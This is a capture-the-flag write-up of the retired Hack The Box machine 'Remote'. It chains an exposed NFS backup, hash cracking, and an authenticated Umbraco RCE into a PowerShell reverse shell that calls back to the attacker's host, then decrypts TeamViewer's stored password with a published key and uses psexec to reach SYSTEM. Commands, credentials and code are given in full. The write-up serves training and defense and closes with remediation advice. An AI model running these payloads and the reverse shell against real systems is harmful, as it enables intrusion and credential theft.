---
title: "Hack The Box — Remote"
summary: "Remote exposes an NFS backup with Umbraco credentials; authenticated CMS RCE yields an IIS shell, and TeamViewer password reuse leads to SYSTEM."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Windows"
solvedAt: 2026-10-01
publishedAt: 2026-10-01
tags:
  - nfs
  - umbraco
  - password-cracking
  - authenticated-rce
  - powershell
  - teamviewer
  - credential-reuse
  - privilege-escalation
tools:
  - Nmap
  - showmount
  - Hashcat
  - Python
  - PowerShell
  - Impacket
cves:
  - CVE-2019-25137
  - CVE-2019-18988
htbUrl: "https://app.hackthebox.com/machines/Remote"
cover: "/images/writeups/hackthebox/machines/remote/remote.png"
coverAlt: "Hack The Box Remote artwork showing a person at a laptop inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. Remote was confirmed as **Retired** on 1 October 2026, and its [HTB machine page](https://app.hackthebox.com/machines/Remote) offers an official write-up. HTB says machine walkthroughs become available [after retirement](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box). Flag values, personal VPN addresses, and unrelated secrets are omitted. Retired lab credentials are included where needed to reproduce the attack.

## Executive summary

Remote exposes an NFS export containing a backup of its Umbraco website. The backup includes a SQL Server Compact database with an administrator email and a crackable SHA-1 password hash. After logging in to Umbraco 7.12.4, an authenticated XSLT code execution flaw provides commands as the IIS application pool identity. A reverse shell reveals TeamViewer 7 and its encrypted unattended-access password in the registry. TeamViewer 7 uses a recoverable, shared AES key; the decrypted password also works for the local Windows Administrator account. Impacket `psexec` then starts a service and returns a SYSTEM shell.

## Target information

| Item | Value |
| --- | --- |
| Target | Remote |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Windows |
| Publication policy | Retired; official write-up available on the [HTB machine page](https://app.hackthebox.com/machines/Remote) |
| Solved | 1 October 2026 |
| Main weaknesses | World-readable NFS backup, [Umbraco authenticated RCE](https://www.exploit-db.com/exploits/46153), [TeamViewer shared-key encryption](https://whynotsecurity.com/blog/teamviewer/), password reuse |

The target IP and your VPN IP change between HTB sessions. Substitute your own values throughout:

```bash
export TARGET_IP='<TARGET_IP>'
export LHOST='<YOUR_TUN0_IP>'
```

## Enumeration

I scanned all TCP ports with service detection and Nmap's default scripts:

```bash
nmap "$TARGET_IP" -T5 -sVC -p-
```

The scan found a Windows web server, anonymous FTP, SMB, WinRM, and NFS. The ports that shaped the attack path were:

```text
21/tcp    open  ftp      Microsoft ftpd (anonymous login allowed)
80/tcp    open  http     Acme Widgets website
111/tcp   open  rpcbind
445/tcp   open  smb
2049/tcp  open  nfs
5985/tcp  open  http     WinRM
```

The scan also listed Windows RPC ports, including 135, 139, 47001, and several high ports. Nmap reported a retransmission-cap warning with `-T5`, so I would rescan individual uncertain services with a gentler timing setting before treating them as closed. Here, `rpcbind` and NFS already provided a direct lead.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| `rpcbind` and NFS on ports 111 and 2049 | An exported filesystem might expose the website backup. |
| HTTP title `Home - Acme Widgets` | The web application gave context for files found in the export. |
| SMB on 445 | Later, valid local Administrator credentials could be tested with Impacket. |
| Anonymous FTP | Worth recording, but no FTP data was needed for this path. |

### Mounting the NFS backup

`showmount` identified the exact exported directory:

```bash
showmount -e "$TARGET_IP"
```

```text
Export list for <TARGET_IP>:
/site_backups (everyone)
```

I mounted it read-only and searched for Umbraco data:

```bash
mkdir -p nfs
sudo mount -t nfs -o vers=3,ro,nolock \
  "$TARGET_IP":/site_backups ./nfs
mountpoint ./nfs
find ./nfs -type f \( -iname '*.sdf' -o -iname '*umbraco*' \) 2>/dev/null
```

The export was a website backup. It contained `App_Data/Umbraco.sdf`, `Web.config`, the Umbraco application files, and logs. The `.sdf` file was the most useful lead because it held the CMS user data. `Web.config` disclosed the installed version:

```bash
grep -i 'umbracoConfigurationStatus' ./nfs/Web.config
```

```text
<add key="umbracoConfigurationStatus" value="7.12.4" />
```

## Initial access

### Recovering the Umbraco administrator password

I copied the database from the read-only mount and extracted printable strings. The single-byte search was useful here; searching for `admin` alone also returned large amounts of ordinary page content.

```bash
cp ./nfs/App_Data/Umbraco.sdf ./Umbraco.sdf
strings -a -e s ./Umbraco.sdf \
  | grep -Eio '[[:alnum:]._%+-]+@[[:alnum:].-]+\.[[:alpha:]]{2,}|[0-9a-f]{40}' \
  | sort -u
```

Among the database strings were `admin@htb.local` and a 40-character hex digest:

```text
admin@htb.local
b8be16afba8c314ad33d812f22a04991b90e2aaa
```

I tested the digest as SHA-1 with Hashcat mode `100` and `rockyou.txt`. [Hashcat's example-hash table](https://hashcat.net/wiki/doku.php?id=example_hashes) documents that mode.

```bash
printf '%s\n' 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > umbraco.hash
hashcat -m 100 -a 0 umbraco.hash /usr/share/wordlists/rockyou.txt
hashcat -m 100 --show umbraco.hash
```

The recovered password was `baconandcheese`. I used `admin@htb.local` and that password to authenticate at `http://<TARGET_IP>/umbraco/`.

### Umbraco 7.12.4 authenticated RCE

The installed version matches the [authenticated XSLT code execution PoC](https://www.exploit-db.com/exploits/46153), also tracked as [CVE-2019-25137](https://github.com/advisories/GHSA-m3p3-xhrf-jxm7). It requires administrator authentication; the NFS-exposed credentials supplied that prerequisite. I used [noraj's argument-driven rewrite](https://github.com/noraj/Umbraco-RCE), which prints command output.

```bash
git clone https://github.com/noraj/Umbraco-RCE.git
cd Umbraco-RCE
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

python3 exploit.py -u admin@htb.local -p 'baconandcheese' \
  -i "http://$TARGET_IP" -c whoami
```

```text
iis apppool\defaultapppool
```

That output confirmed command execution in the IIS application pool context. The flaw lets an authenticated administrator submit an XSLT stylesheet containing C# script to Umbraco's XSLT visualizer. The application starts the supplied process and returns its standard output.

### Obtaining a PowerShell shell

The PoC can run one command at a time. For local enumeration, I used it to launch a PowerShell reverse shell. The following script accepts commands over a TCP connection and returns their output:

```bash
cat > reverse.ps1 <<'EOF'
$client = New-Object System.Net.Sockets.TCPClient('VPN_IP_HERE',4444)
$stream = $client.GetStream()
[byte[]]$buffer = New-Object byte[] 65536
while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
  $command = [System.Text.Encoding]::UTF8.GetString($buffer,0,$count)
  $result = (Invoke-Expression $command 2>&1 | Out-String)
  $prompt = "PS $((Get-Location).Path)> "
  $data = [System.Text.Encoding]::UTF8.GetBytes($result + $prompt)
  $stream.Write($data,0,$data.Length)
}
$client.Close()
EOF

sed -i "s/VPN_IP_HERE/$LHOST/" reverse.ps1
ENC=$(iconv -f UTF-8 -t UTF-16LE reverse.ps1 | base64 -w 0)
```

PowerShell's `-EncodedCommand` expects a UTF-16LE string encoded as Base64, which avoids nested quoting problems in the XSLT payload. [Microsoft documents this encoding requirement](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1).

In a second Kali terminal, I started a listener:

```bash
nc -lvnp 4444
```

Back in the terminal containing `$ENC`, I launched the payload:

```bash
python3 exploit.py -u admin@htb.local -p 'baconandcheese' \
  -i "http://$TARGET_IP" -c powershell.exe \
  -a "-NoProfile -EncodedCommand $ENC"
```

The exploit terminal remained busy because its process waited for the long-lived PowerShell command to finish. The listener received a connection from the target. `whoami` in that shell still returned `iis apppool\defaultapppool`.

### User flag location

Only the `Administrator` and `Public` interactive profiles were present under `C:\Users`. The user flag was on the Public desktop:

```powershell
Get-ChildItem C:\Users\Public\Desktop -Force
Get-Content C:\Users\Public\Desktop\user.txt
```

Submit the value to HTB; its contents are intentionally omitted here.

## Privilege escalation

### Identifying TeamViewer 7

The Public desktop contained a `TeamViewer 7.lnk` shortcut. Service enumeration confirmed that TeamViewer 7 was installed and that its service ran as `LocalSystem`:

```powershell
Get-CimInstance Win32_Service |
  Where-Object Name -match 'TeamViewer' |
  Select-Object Name, PathName, StartName
```

```text
Name         TeamViewer7
PathName     C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe
StartName    LocalSystem
```

The TeamViewer registry value `SecurityPasswordAES` stores an encrypted static session password in versions older than 9, according to [TeamViewer's own clarification](https://community.teamviewer.com/English/discussion/82264/~/English/categories/community-blog-en). I queried its 32-bit registry view:

```powershell
reg.exe query "HKLM\SOFTWARE\TeamViewer\Version7" /v SecurityPasswordAES /reg:32
```

The output contained a `REG_BINARY` ciphertext. The equivalent explicit path in the 64-bit registry view was `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`.

### Decrypting the saved password

The [original TeamViewer research](https://whynotsecurity.com/blog/teamviewer/) recovered the shared AES-128-CBC key and IV used for this legacy value. I copied the `REG_BINARY` hex to Kali and decrypted it locally. The script below strips valid PKCS#7 padding if present, then decodes the UTF-16LE plaintext:

```bash
pip install pycryptodome

cat > tv_decrypt.py <<'PY'
import sys
from Crypto.Cipher import AES

key = bytes.fromhex('0602000000a400005253413100040000')
iv = bytes.fromhex('0100010067244F436E6762F25EA8D704')
ciphertext = bytes.fromhex(sys.argv[1])

raw = AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext)
pad = raw[-1]
if 1 <= pad <= 16 and raw.endswith(bytes([pad]) * pad):
    raw = raw[:-pad]

print(raw.decode('utf-16le', errors='ignore').split('\x00')[0])
PY

python3 tv_decrypt.py '<REG_BINARY_HEX_FROM_TARGET>'
```

For this lab, the plaintext was `!R3m0te!`. Recovering a TeamViewer password did **not** by itself grant Windows administrator rights. The decisive misconfiguration was that the same password had been reused for the local `Administrator` account.

### Administrator credentials to SYSTEM

I left the Python virtual environment before using Kali's system Impacket installation, then connected over SMB. Omitting the password from the command makes `psexec` prompt for it:

```bash
deactivate
impacket-psexec "Administrator@$TARGET_IP"
```

I entered the recovered TeamViewer password at the prompt. Impacket found a writable `ADMIN$` share, uploaded its temporary service executable, and started a service. [Impacket's `psexec` implementation](https://github.com/fortra/impacket/blob/master/examples/psexec.py) uses this service-based execution path. Run `whoami` in the resulting Windows shell to verify the SYSTEM context, then read the Administrator desktop flag:

```cmd
whoami
type C:\Users\Administrator\Desktop\root.txt
```

The root flag value is omitted. The `root.txt` file was on the Administrator desktop.

## What did not work

- Mounting the literal placeholder `/EXPORT_PATH` failed with “No such file or directory.” `showmount -e` supplied the actual export, `/site_backups`.
- Searching only for `admin` in UTF-16LE strings produced extensive page-content matches. Extracting email-shaped strings and 40-character hex values from the single-byte strings exposed the useful database entries.
- Running `impacket-psexec` while a minimal Python virtual environment was active failed with `ModuleNotFoundError: No module named 'six'`. Deactivating that environment restored Kali's packaged Impacket dependencies.

## Attack path

1. Scan the target and enumerate the NFS export with `showmount`.
2. Mount `/site_backups` read-only; copy `Umbraco.sdf` and identify the Umbraco administrator hash.
3. Crack the SHA-1 digest, authenticate to Umbraco 7.12.4, and use its authenticated XSLT RCE to obtain an IIS shell.
4. Read the user flag from the Public desktop and enumerate TeamViewer 7.
5. Decrypt TeamViewer's registry password with the published AES key and IV.
6. Reuse that password for the local Administrator account and run Impacket `psexec` to reach SYSTEM.

## Lessons learned

- A readable website backup can expose credentials even when the live application requires authentication. Restrict NFS exports and remove secrets from backup copies available to low-trust clients.
- Version and privilege requirements matter. The Umbraco RCE required administrator access, which the leaked database credential supplied.
- Reversible local password storage and password reuse created the escalation path. Use distinct credentials for remote-support tools and Windows accounts, and migrate legacy TeamViewer installations to supported versions.
- Confirm every trust-boundary crossing with evidence: `whoami` after RCE, registry data for the TeamViewer credential, and `whoami` again after `psexec`.

## References

- [Hack The Box — Remote machine](https://app.hackthebox.com/machines/Remote)
- [HTB Help Center — Machine walkthrough availability](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box)
- [Exploit Database — Umbraco 7.12.4 authenticated RCE](https://www.exploit-db.com/exploits/46153)
- [noraj — Umbraco RCE PoC](https://github.com/noraj/Umbraco-RCE)
- [Original TeamViewer password-storage research](https://whynotsecurity.com/blog/teamviewer/)
- [TeamViewer — Specification on CVE-2019-18988](https://community.teamviewer.com/English/discussion/82264/~/English/categories/community-blog-en)
- [Fortra Impacket — `psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
